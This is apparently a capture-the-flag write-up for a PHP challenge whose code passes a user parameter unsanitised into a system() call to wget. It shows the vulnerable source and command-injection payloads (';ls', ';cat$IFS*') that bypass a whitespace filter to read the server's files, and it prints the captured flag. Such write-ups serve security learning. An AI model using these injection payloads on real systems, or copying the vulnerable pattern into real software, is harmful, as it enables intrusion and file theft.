We access the page and pe notice nothing. Looking at the html we notice
a comment `<!--- /?source -->`. Adding the source query parameter we see
the followings:

```
<?php

error_reporting(0);
(isset($_GET['source']) AND show_source(__FILE__) AND die()); 

if(isset($_REQUEST['p'])){
    
    $p = preg_replace('/[^\x21-\x7e]/','', $_REQUEST['p']);
    $p = str_replace("flag", "", $p);
    $p = substr($p,0,9);
    
    system("wget -qO - " . $p . " 2>&1");

}

?>
<!-- /?source -->
```

Idea we need to inject a command with the parameter `p` so that we bypass the
filters. We use `http://34.141.72.235:32228/?p=;ls` and we notice `2` files
`flag.php` and `index.php`. We leak their content using this since spaces are
filtered:

```
http://34.141.72.235:32228/?p=;cat$IFS*
```

The result is:

```
<?php

//CTF{a9b6b13862f0a8d1312d777a91a596eba7cb010f}

?><?php

error_reporting(0);
(isset($_GET['source']) AND show_source(__FILE__) AND die()); 

if(isset($_REQUEST['p'])){
	
	$p = preg_replace('/[^\x21-\x7e]/','', $_REQUEST['p']);
	$p = str_replace("flag", "", $p);
	$p = substr($p,0,9);
	
	system("wget -qO - " . $p . " 2>&1");

}

?>
<!-- /?source --><!-- /?source -->
```

The flag was:

```
CTF{a9b6b13862f0a8d1312d777a91a596eba7cb010f}
```
